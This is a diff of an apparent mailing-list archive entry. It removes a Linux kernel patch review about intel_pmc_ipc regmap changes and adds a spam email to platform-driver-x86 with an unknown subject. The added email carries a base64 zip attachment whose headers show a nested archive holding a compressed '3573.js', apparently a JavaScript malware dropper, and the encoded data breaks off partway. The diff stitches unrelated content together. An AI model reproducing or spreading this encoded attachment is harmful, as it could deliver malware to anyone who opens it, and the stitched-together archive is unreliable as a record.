@@ -1,290 +1,146 @@
-From: sathyanarayanan kuppuswamy
-        <sathyanarayanan.kuppuswamy-VuQAYsv1563Yd54FQh9/CA@public.gmane.org>
-Subject: Re: [RFC v3 3/7] platform/x86: intel_pmc_ipc: Use regmap calls for
- GCR updates
-Date: Tue, 3 Oct 2017 18:16:32 -0700
-Message-ID: <5ba5b3d9-b55a-5834-04e5-b4b9a356dca7@linux.intel.com>
-References: <cover.1504588701.git.sathyanarayanan.kuppuswamy@linux.intel.com>
- <5286489131571f149c6b75a8367ceb93cfe6e6be.1504588701.git.sathyanarayanan.kuppuswamy@linux.intel.com>
- <CAHp75VdGEf_e6mopQmFG5+Dv3X1f5TwV8cHn2CjA39USqN1JBw@mail.gmail.com>
-Reply-To: sathyanarayanan.kuppuswamy-VuQAYsv1563Yd54FQh9/CA@public.gmane.org
+From: <susan.christian@state.sd.us>
+Subject: (unknown)
+Date: Wed, 04 Oct 2017 11:44:10 -0000
+Message-ID: <150711745086.32756.4521686543597768706@fastwebnet.it>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=utf-8; format=flowed
-Content-Transfer-Encoding: 7bit
-Return-path: <linux-watchdog-owner-u79uwXL29TY76Z2rM5mHXA@public.gmane.org>
-In-Reply-To: <CAHp75VdGEf_e6mopQmFG5+Dv3X1f5TwV8cHn2CjA39USqN1JBw-JsoAwUIsXosN+BqQ9rBEUg@public.gmane.org>
-Content-Language: en-US
-Sender: linux-watchdog-owner-u79uwXL29TY76Z2rM5mHXA@public.gmane.org
-To: Andy Shevchenko <andy.shevchenko-Re5JQEeQqe8AvxtiuMwx3w@public.gmane.org>
-Cc: Alessandro Zummo <a.zummo-BfzFCNDTiLLj+vYz1yj4TQ@public.gmane.org>, "x86-DgEjT+Ai2ygdnm+yROfE0A@public.gmane.org" <x86-DgEjT+Ai2ygdnm+yROfE0A@public.gmane.org>, Wim Van Sebroeck <wim-IQzOog9fTRqzQB+pC5nmwQ@public.gmane.org>, Ingo Molnar <mingo-H+wXaHxf7aLQT0dZR+AlfA@public.gmane.org>, Alexandre Belloni <alexandre.belloni-wi1+55ScJUtKEb57/3fJTNBPR1lH4CV8@public.gmane.org>, Zha Qipeng <qipeng.zha-ral2JQCrhuEAvxtiuMwx3w@public.gmane.org>, "H. Peter Anvin" <hpa-YMNOUZJC4hwAvxtiuMwx3w@public.gmane.org>, "dvhart-wEGCiKHe2LqWVfeAwA7xHQ@public.gmane.org" <dvhart-wEGCiKHe2LqWVfeAwA7xHQ@public.gmane.org>, Thomas Gleixner <tglx-hfZtesqFncYOwBW4kG4KsQ@public.gmane.org>, Lee Jones <lee.jones-QSEj5FYQhm4dnm+yROfE0A@public.gmane.org>, Andy Shevchenko <andy-wEGCiKHe2LqWVfeAwA7xHQ@public.gmane.org>, Souvik Kumar Chakravarty <souvik.k.chakravarty-ral2JQCrhuEAvxtiuMwx3w@public.gmane.org>, linux-rtc-u79uwXL29TY76Z2rM5mHXA@public.gmane.org, linux-watchdog-u79uwXL29TY76Z2rM5mHXA@public.gmane.org, "linux-kernel-u79uwXL29TY76Z2rM5mHXA@public.gmane.org" <linux-kernel-u79uwXL29TY76Z2rM5mHXA@public.gmane.org>, Platform Driver <platform-driver-x86-u79uwXL29TY76Z2rM5mHXA@public.gmane.org>, Sathyanarayanan Kuppuswamy Natarajan <sathyaosid-Re5JQEeQqe8AvxtiuMwx3w@public.gmane.org>
-List-Id: platform-driver-x86.vger.kernel.org
+Content-Type: application/zip; name="18225093198369.zip"
+Content-Transfer-Encoding: base64
+Return-path: <platform-driver-x86-owner@vger.kernel.org>
+Received: from 92-223-130-2.ip274.fastwebnet.it ([92.223.130.2]:53811 "HELO
+        fastwebnet.it" rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org with SMTP
+        id S1751696AbdJDLoN (ORCPT
+        <rfc822;platform-driver-x86@vger.kernel.org>);
+        Wed, 4 Oct 2017 07:44:13 -0400
+Subject: 
+Content-Disposition: attachment
+Sender: platform-driver-x86-owner@vger.kernel.org
+List-ID: <platform-driver-x86.vger.kernel.org>
+To: platform-driver-x86@vger.kernel.org
 
-Hi Andy,
-
-
-On 10/01/2017 07:48 AM, Andy Shevchenko wrote:
-> On Tue, Sep 5, 2017 at 8:37 AM,
-> <sathyanarayanan.kuppuswamy-VuQAYsv1563Yd54FQh9/CA@public.gmane.org> wrote:
->> From: Kuppuswamy Sathyanarayanan <sathyanarayanan.kuppuswamy-VuQAYsv1563Yd54FQh9/CA@public.gmane.org>
->>
->> Currently, update_no_reboot_bit() function implemented in this driver
->> uses mutex_lock to protect its register updates. But this function is
->> called with in atomic context in iTCO_wdt_start() and iTCO_wdt_stop()
->> functions in iTCO_wdt.c driver, which in turn causes "sleeping into
->> atomic context" issue. This patch fixes this issue by refactoring the
->> current GCR read/write/update functions with regmap APIs.
-> Since it sounds as candidate for stable,
-Yes.
-> can we have split it to just
-> as less as possible intrusive fix + moving to regmap as a separate
-> change?
-If we have to split it into two patches then,
-
-Patch #1 will fix the "sleep in atomic context issue" by replacing 
-mutex_lock() with spin_lock()
-in GCR read/write APIs to protect the GCR memory updates.
-Patch #2 will remove GCR read/write/update APIs and replace it with 
-regmap APIs. But along with this
-change we will also remove the spin_lock() added in previous patch 
-because regmap calls are already
-protected by its own locking mechanism.
-
-Since Patch #2 will clean up what we do in Patch #1, Do we need to split 
-it into two patches?
-
-> It should include Fixes: tag as well I suppose.
-Agree. I will add Fixes tag in next version.
->
->> Signed-off-by: Kuppuswamy Sathyanarayanan <sathyanarayanan.kuppuswamy-VuQAYsv1563Yd54FQh9/CA@public.gmane.org>
->> ---
->>   drivers/platform/x86/Kconfig         |   1 +
->>   drivers/platform/x86/intel_pmc_ipc.c | 115 ++++++++++++-----------------------
->>   2 files changed, 40 insertions(+), 76 deletions(-)
->>
->> diff --git a/drivers/platform/x86/Kconfig b/drivers/platform/x86/Kconfig
->> index 80b8795..45f4e79 100644
->> --- a/drivers/platform/x86/Kconfig
->> +++ b/drivers/platform/x86/Kconfig
->> @@ -1054,6 +1054,7 @@ config PVPANIC
->>   config INTEL_PMC_IPC
->>          tristate "Intel PMC IPC Driver"
->>          depends on ACPI
->> +       select REGMAP_MMIO
->>          ---help---
->>          This driver provides support for PMC control on some Intel platforms.
->>          The PMC is an ARC processor which defines IPC commands for communication
->> diff --git a/drivers/platform/x86/intel_pmc_ipc.c b/drivers/platform/x86/intel_pmc_ipc.c
->> index 021dcf6..40a25f8 100644
->> --- a/drivers/platform/x86/intel_pmc_ipc.c
->> +++ b/drivers/platform/x86/intel_pmc_ipc.c
->> @@ -31,9 +31,11 @@
->>   #include <linux/atomic.h>
->>   #include <linux/notifier.h>
->>   #include <linux/suspend.h>
->> +#include <linux/spinlock.h>
->>   #include <linux/acpi.h>
->>   #include <linux/io-64-nonatomic-lo-hi.h>
->>   #include <linux/mfd/core.h>
->> +#include <linux/regmap.h>
->>
->>   #include <asm/intel_pmc_ipc.h>
->>
->> @@ -125,7 +127,7 @@ static struct intel_pmc_ipc_dev {
->>
->>          /* gcr */
->>          void __iomem *gcr_mem_base;
->> -       bool has_gcr_regs;
->> +       struct regmap *gcr_regs;
->>
->>          /* Telemetry */
->>          u8 telem_res_inval;
->> @@ -150,6 +152,14 @@ static char *ipc_err_sources[] = {
->>                  "Unsigned kernel",
->>   };
->>
->> +static struct regmap_config gcr_regmap_config = {
->> +        .reg_bits = 32,
->> +        .reg_stride = 4,
->> +        .val_bits = 32,
->> +       .fast_io = true,
->> +       .max_register = PLAT_RESOURCE_GCR_SIZE,
->> +};
->> +
->>   /* Prevent concurrent calls to the PMC */
->>   static DEFINE_MUTEX(ipclock);
->>
->> @@ -183,21 +193,6 @@ static inline u32 ipc_data_readl(u32 offset)
->>          return readl(ipcdev.ipc_base + IPC_READ_BUFFER + offset);
->>   }
->>
->> -static inline u64 gcr_data_readq(u32 offset)
->> -{
->> -       return readq(ipcdev.gcr_mem_base + offset);
->> -}
->> -
->> -static inline int is_gcr_valid(u32 offset)
->> -{
->> -       if (!ipcdev.has_gcr_regs)
->> -               return -EACCES;
->> -
->> -       if (offset > PLAT_RESOURCE_GCR_SIZE)
->> -               return -EINVAL;
->> -
->> -       return 0;
->> -}
->>
->>   /**
->>    * intel_pmc_gcr_read() - Read PMC GCR register
->> @@ -210,21 +205,10 @@ static inline int is_gcr_valid(u32 offset)
->>    */
->>   int intel_pmc_gcr_read(u32 offset, u32 *data)
->>   {
->> -       int ret;
->> -
->> -       mutex_lock(&ipclock);
->> -
->> -       ret = is_gcr_valid(offset);
->> -       if (ret < 0) {
->> -               mutex_unlock(&ipclock);
->> -               return ret;
->> -       }
->> -
->> -       *data = readl(ipcdev.gcr_mem_base + offset);
->> -
->> -       mutex_unlock(&ipclock);
->> +       if (!ipcdev.gcr_regs)
->> +               return -EACCES;
->>
->> -       return 0;
->> +       return regmap_read(ipcdev.gcr_regs, offset, data);
->>   }
->>   EXPORT_SYMBOL_GPL(intel_pmc_gcr_read);
->>
->> @@ -240,21 +224,10 @@ EXPORT_SYMBOL_GPL(intel_pmc_gcr_read);
->>    */
->>   int intel_pmc_gcr_write(u32 offset, u32 data)
->>   {
->> -       int ret;
->> -
->> -       mutex_lock(&ipclock);
->> -
->> -       ret = is_gcr_valid(offset);
->> -       if (ret < 0) {
->> -               mutex_unlock(&ipclock);
->> -               return ret;
->> -       }
->> -
->> -       writel(data, ipcdev.gcr_mem_base + offset);
->> -
->> -       mutex_unlock(&ipclock);
->> +       if (!ipcdev.gcr_regs)
->> +               return -EACCES;
->>
->> -       return 0;
->> +       return regmap_write(ipcdev.gcr_regs, offset, data);
->>   }
->>   EXPORT_SYMBOL_GPL(intel_pmc_gcr_write);
->>
->> @@ -271,33 +244,10 @@ EXPORT_SYMBOL_GPL(intel_pmc_gcr_write);
->>    */
->>   int intel_pmc_gcr_update(u32 offset, u32 mask, u32 val)
->>   {
->> -       u32 new_val;
->> -       int ret = 0;
->> -
->> -       mutex_lock(&ipclock);
->> -
->> -       ret = is_gcr_valid(offset);
->> -       if (ret < 0)
->> -               goto gcr_ipc_unlock;
->> -
->> -       new_val = readl(ipcdev.gcr_mem_base + offset);
->> -
->> -       new_val &= ~mask;
->> -       new_val |= val & mask;
->> -
->> -       writel(new_val, ipcdev.gcr_mem_base + offset);
->> -
->> -       new_val = readl(ipcdev.gcr_mem_base + offset);
->> -
->> -       /* check whether the bit update is successful */
->> -       if ((new_val & mask) != (val & mask)) {
->> -               ret = -EIO;
->> -               goto gcr_ipc_unlock;
->> -       }
->> +       if (!ipcdev.gcr_regs)
->> +               return -EACCES;
->>
->> -gcr_ipc_unlock:
->> -       mutex_unlock(&ipclock);
->> -       return ret;
->> +       return regmap_update_bits(ipcdev.gcr_regs, offset, mask, val);
->>   }
->>   EXPORT_SYMBOL_GPL(intel_pmc_gcr_update);
->>
->> @@ -776,16 +726,24 @@ static int ipc_plat_get_res(struct platform_device *pdev)
->>   int intel_pmc_s0ix_counter_read(u64 *data)
->>   {
->>          u64 deep, shlw;
->> +       int ret;
->>
->> -       if (!ipcdev.has_gcr_regs)
->> +       if (!ipcdev.gcr_regs)
->>                  return -EACCES;
->>
->> -       deep = gcr_data_readq(PMC_GCR_TELEM_DEEP_S0IX_REG);
->> -       shlw = gcr_data_readq(PMC_GCR_TELEM_SHLW_S0IX_REG);
->> +       ret = regmap_bulk_read(ipcdev.gcr_regs, PMC_GCR_TELEM_DEEP_S0IX_REG,
->> +                       &deep, 2);
->> +       if (ret)
->> +               return ret;
->> +
->> +       ret = regmap_bulk_read(ipcdev.gcr_regs, PMC_GCR_TELEM_SHLW_S0IX_REG,
->> +                       &shlw, 2);
->> +       if (ret)
->> +               return ret;
->>
->>          *data = S0IX_RESIDENCY_IN_USECS(deep, shlw);
->>
->> -       return 0;
->> +       return ret;
->>   }
->>   EXPORT_SYMBOL_GPL(intel_pmc_s0ix_counter_read);
->>
->> @@ -817,6 +775,13 @@ static int ipc_plat_probe(struct platform_device *pdev)
->>                  return ret;
->>          }
->>
->> +        ipcdev.gcr_regs = devm_regmap_init_mmio_clk(ipcdev.dev, NULL,
->> +                       ipcdev.gcr_mem_base, &gcr_regmap_config);
->> +        if (IS_ERR(ipcdev.gcr_regs)) {
->> +                dev_err(ipcdev.dev, "gcr_regs regmap init failed\n");
->> +                return PTR_ERR(ipcdev.gcr_regs);;
->> +        }
->> +
->>          ret = ipc_create_pmc_devices(pdev);
->>          if (ret) {
->>                  dev_err(&pdev->dev, "Failed to create pmc devices\n");
->> @@ -836,8 +801,6 @@ static int ipc_plat_probe(struct platform_device *pdev)
->>                  return ret;
->>          }
->>
->> -       ipcdev.has_gcr_regs = true;
->> -
->>          return 0;
->>   }
->>
->> --
->> 2.7.4
->>
->
->
-
--- 
-Sathyanarayanan Kuppuswamy
-Linux kernel developer
-
---
-To unsubscribe from this list: send the line "unsubscribe linux-watchdog" in
-the body of a message to majordomo-u79uwXL29TY76Z2rM5mHXA@public.gmane.org
-More majordomo info at  http://vger.kernel.org/majordomo-info.html
+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
